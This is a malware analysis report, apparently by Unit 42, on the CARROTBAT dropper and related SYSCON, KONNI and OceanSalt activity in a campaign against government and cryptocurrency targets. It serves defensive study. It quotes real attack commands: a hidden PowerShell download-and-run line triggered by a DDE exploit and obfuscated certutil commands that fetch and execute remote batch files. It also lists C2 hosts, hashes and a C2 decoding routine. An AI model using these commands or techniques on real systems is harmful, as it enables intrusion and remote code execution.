These lures revolve around a series of subjects, including various cryptocurrencies,\ncryptocurrency exchanges, and political events. Based on various information witnessed\nwithin this dropper, Unit 42 has dubbed this malware family CARROTBAT.\n\nCARROTBAT was initially discovered in an attack on December 2017. This attack was made\nagainst a British government agency using the SYSCON malware family. [SYSCON is a](https://blog.trendmicro.com/trendlabs-security-intelligence/syscon-backdoor-uses-ftp-as-a-cc-channel/)\nsimple remote access Trojan (RAT) that uses the file transfer protocol (FTP) for network\ncommunications. While there is no evidence that this attack against a British government\n\n\n-----\n\nagency made use of the CARROTBAT dropper, we found overlaps within this attack s\ninfrastructure that ultimately lead us to CARROTBAT’s initial discovery, as well as other ties\nbetween these two malware families.\n\nIn total, 29 unique CARROTBAT samples have been identified to date, containing a total of\n12 confirmed unique decoy documents. These samples began appearing in March of this\nyear, with the majority of activity taking place within the past 3 months. The payloads vary, as\nearlier instances delivered SYSCON, while newer instances are delivering the previously\nreported [OceanSalt malware family. CARROTBAT and their associated payloads constitute a](https://www.mcafee.com/enterprise/en-us/assets/reports/rp-operation-oceansalt.pdf)\ncampaign that we are dubbing ‘Fractured Block’.\n\nInitial Attack\n\nOn December 13, 2017, a spear phishing email was sent from the email address of\nyuri.sidorav@yandex[.]ru to a high ranking individual within a British government agency.\nThis email contained the following subject, with an attached document file of the same name:\n\nUS. would talk with North Korea “without precondition”\n\nWithin this attached Word document, the following text is displayed:\n\nU.S. would talk with North Korea “without precondition”: Tillerson, By Seungmock Oh\n\n[This text references an article that was published on the same day as the attack by](https://www.nknews.org/2017/12/u-s-would-talk-with-north-korea-without-precondition-tillerson/)\nNKNews[.]org. The article in question discusses diplomatic ties between the United States\nand North Korea.\n\n\n-----\n\n_Figure 1 Article referenced by decoy document in attack against British government agency_\n\n[The attached document leverages a DDE exploit to ultimately execute the following code:](https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/)\n\n\n-----\n\n1 c:\\\\windows\\\\system32\\\\cmd.exe \"/k PowerShell.exe -ExecutionPolicy bypass windowstyle hidden -noprofile -command (New-Object\nSystem.Net.WebClient).DownloadFile('https://881.000webhostapp[.]com/0_31.doc',\n'%TEMP%\\\\AAA.exe');Start-Process('%TEMP%\\\\AAA.exe')\n\nPalo Alto Networks first witnessed this DDE exploit technique in May 2017, and attackers\ncontinue to leverage it. The command run by this particular malware sample attempts to\ndownload a remote executable file named 0_31.doc, which in turn is placed within the\nvictim’s %TEMP% directory with the filename of AAA.exe prior to being executed.\n\nThe payload in question belongs to the SYSCON malware family. It communicates with\nftp.bytehost31[.]org via FTP for command and control (C2).\n\n_Figure 2 SYSCON network traffic witnessed during execution_\n\nPivoting on the domain hosting the SYSCON sample, 881.000webhostapp[.]com, revealed a\nnumber of additional samples, including a sample of the KONNI malware family, and four 64bit executable files belonging to the CARROTBAT malware family. Pivoting further on\ncharacteristics belonging to CARROTBAT ultimately led to the identification of 29 unique\nsamples in this malware family.\n\nFractured Block Campaign\n\nThe campaign dubbed Fractured Block encompasses all CARROTBAT samples identified to\ndate. CARROTBAT itself is a dropper that allows an attacker to drop and open an embedded\ndecoy file, followed by the execution of a command that will download and run a payload on\n\n\n-----\n\nthe targeted machine. In total, the following 11 decoy document file formats are supported by\nthis malware:\n\ndoc\n.docx\n.eml\n.hwp\n.jpg\n.pdf\n.png\n.ppt\n.pptx\n.xls\n.xlsx\n\nAfter the embedded decoy document is opened, an obfuscated command such as the\nfollowing is executed on the system:\n\n1 C: && cd %TEMP% && c^e^r^tutil -urlca^che -spl^it -f\nhttps://881.000webhostapp[.]com/1.txt && ren 1.txt 1.bat && 1.bat && exit\n\nThis command will attempt to download and execute a remote file via the Microsoft Windows\nbuilt-in certutil utility. More information on this technique and the CARROTBAT malware\nfamily may be found within the Appendix.\n\nThe 29 unique CARROTBAT malware samples have compile timestamps between March\n2018 to September 2018. Of these 29 unique samples, 11 unique decoy documents were\nleveraged in attacks, as seen in the figure below:\n\n\n-----\n\n_Figure 3 Timeline of decoy documents being dropped by CARROTBAT_\n\nA majority of the decoy documents targeting victims in Korea had subject matter related to\ncryptocurrencies. In one unique case, the decoy contains a business card belonging to an\nindividual working at COINVIL, which is an organization that announced plans to build a\ncryptocurrency exchange in the Philippines in May 2018.\n\nAdditional lure subjects included timely political events, such as relations between the U.S.\nand North Korea, as well as a trip by U.S. President Donald Trump to a summit in Singapore.\n\nPayloads for the CARROTBAT samples varied. Originally, between the periods of March\n2018 to July 2018, multiple instances of the SYSCON malware family were observed. These\nsamples communicated with the following hosts via FTP for C2 communication:\n\nftp.byethost7[.]com\nftp.byethost10[.]com\nfiles.000webhost[.]com\n\nBeginning in June 2018, we observed the OceanSalt malware family being dropped by\nCARROTBAT. These samples continue to be used at the time of this writing, and were\nobserved communicating with the following host for C2 communication:\n\n61.14.210[.]72:7117\n\nInteresting Ties with Other Threat Activity\n\nAs stated earlier within this blog, there is infrastructure overlap between the CARROTBAT\n[and KONNI malware families. KONNI is a RAT that is believed to have been in use for over](https://blog.talosintelligence.com/2017/05/konni-malware-under-radar-for-years.html)\nfour years, with a wide array of functionalities, often leveraging free web hosting providers\nlike 000webhost for its C2 infrastructure. This particular malware family has yet to be\nattributed to a named group at the time of this writing, however, targeting has historically\nfocused on the Southeast Asia region.\n\nAnother relationship we have mentioned repeatedly is the use of the SYSCON malware\n[family. This particular malware family was first reported in October 2017 and has been](https://blog.trendmicro.com/trendlabs-security-intelligence/syscon-backdoor-uses-ftp-as-a-cc-channel/)\nobserved delivering decoy documents pertaining to North Korea. The malware is generally\nunsophisticated, making use of remote FTP servers for C2 communication.\n\nBelow you can see the KONNI usage highlighted in the gold flags and SYSCON highlighted\nin the purple flags.\n\n\n-----\n\n_Figure 4 Maltego diagram correlating malicious activity_\n\nFinally, the third overlap is the OceanSalt malware payload. First reported by McAfee in\nOctober 2018, reported victims include South Korea, the United States, and Canada. Like\nthe samples outlined in the McAfee report, the OceanSalt samples observed in the Fractured\nBlock Campaign employed the same code similarities as those of Comment Crew (aka\nAPT1), however, we believe that these code similarities are a false flag. The malware used\nby Comment Crew has been in circulation for many years, and we do not believe the activity\noutlined in this blog post has any overlap with the older Comment Crew activity.\n\n\n-----\n\n_Figure 5 Threat activity overlap over time_\n\nConclusion\n\nFinding CARROTBAT provided an important lynchpin in identifying Fractured Block\nCampaign activity. Using CARROTBAT, we were able to find related OceanSalt, SYSCON\nand KONNI activity. The various overlaps encountered are notable, and it is our suspicion\nthat this threat activity may all belong to the same threat actor. However, we do not believe\nthere to be enough evidence at this time to make this claim with complete certainty.\n\nThe CARROTBAT malware family is a somewhat unique dropper and while it supports\nvarious types of decoy documents, and employs rudimentary command obfuscation, it\nshould be made clear that it is not sophisticated.\n\nWhile the actors behind Fractured Block remain active,\n\nPalo Alto Networks customers are protected from this threat in the following ways:\n\n[AutoFocus customers can track these samples with the FracturedBlock,](https://autofocus.paloaltonetworks.com/#/tag/Unit42.FracturedBlock) [SYSCON,](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Syscon)\n[KONNI, and](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Konni) [CARROTBAT](https://autofocus.paloaltonetworks.com/#/tag/Unit42.CARROTBAT)\nWildFire detects all files mentioned in this report with malicious verdicts.\nTraps blocks all of the files currently associated with the Fractured Block campaign.\n\nA special thanks to Chronicle's VirusTotal team for their assistance researching this threat.\n\nAppendix\n\n**CARROTBAT Technical Analysis**\n\nFor the analysis below, the following sample is used:\n\nMD5 3e4015366126dcdbdcc8b5c508a6d25c\n\n\n-----\n\nSHA1 f459f9cfbd10b136cafb19cbc233a4c8342ad984\n\nSHA256 aef92be267a05cbff83aec0f23d33dfe0c4cdc71f9a424f5a2e59ba62b7091de\n\nFile Type PE32 executable (GUI) Intel 80386, for MS Windows\n\n\nCompile\nTimestamp\n\n\n2018-09-05 00:17:22 UTC\n\n\nUpon execution, the malware will read the last 8 bytes of itself. These bytes include two\nDWORDs that contain both the length of the embedded decoy document, as well as the type\nof file it is.\n\n_Figure 6 End of CARROTBAT file containing decoy document information_\n\nUsing this gathered information, CARROTBAT continues to read the end of itself, minus the\npreviously retrieved 8 bytes. This data contains the entirety of the embedded decoy\ndocument and is written to the same directory and filename as the original malware sample.\nHowever, the file extension is changed based on the previously retrieved file type value. The\nfollowing corresponding values are used by CARROTBAT:\n\n**Value** **Document Extension**\n\n0x0 .doc\n\n0x1 .pdf\n\n0x2 .jpg\n\n0x3 .xls\n\n0x4 .xlsx\n\n0x5 .hwp\n\n\n-----\n\n0x6 .docx\n\n0x7 .png\n\n0x8 .eml\n\n0x9 .ppt\n\n0xA .pptx\n\nIn this particular case, the .hwp file extension is used for the decoy document. After the\ndecoy is dropped to disk, it is opened in a new process. In this instance, the whitepaper for\nthe BKN Bank cryptocurrency exchange is displayed to the victim:\n\n\n-----\n\n-----\n\n_Figure 7 HWP decoy document displayed to victim_\n\nAfter this document is displayed, the malware will continue to execute the following\ncommand in a new process:\n\n1 C: && cd %TEMP% && c^e^r^tutil -urlca^che -spl^it -f\nhttp://s8877.1apps[.]com/vip/1.txt && ren 1.txt 1.bat && 1.bat && exit\n\nThis command will download a remote file using the built-in Microsoft Windows certutil\ncommand.

In this particular instance, the payload is\nencoded via base64, which certutil decodes. The payload in question is a CAB file that is\nthen unpacked. Finally, the malware executes the extracted install.bat script before deleting\nthe original files and exiting.\n\n\n-----\n\n_Figure 8 CARROTBAT downloading final payload via certutil_\n\nThe downloaded CAB file has the following properties:\n\nMD5 a943e196b83c4acd9c5ce13e4c43b4f4\n\nSHA1 e66e416f300c7efb90c383a7630c9cfe901ff9fd\n\nSHA256 cfe436c1f0ce5eb7ac61b32cd073cc4e4b21d5016ceef77575bef2c2783c2d62\n\nFile Type Microsoft Cabinet archive data, 181248 bytes, 3 files\n\nThe following three files and their descriptions are dropped by this CAB file:\n\n\n-----\n\n**Filename** **Purpose**\n\nInstall.bat Installation batch script responsible for copying the other files to\nC:\\Users\\Public\\Downloads and setting the Run registry key to ensure\npersistence. It will also remove any original files before exiting.\n\nDrvUpdate.dll Instance of the OceanSalt malware family.\n\nwinnet.ini Encoded C2 information.\n\nThe C2 information is stored via the external winnet.ini file and is encoded using an\nincremental XOR key. The following function written in Python may be used to decode this\nfile:\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\ndef decode(data):\nout = \"\"\nc = 0\nfor d in data:\nout += chr(ord(d)^c)\nc+=1\nreturn
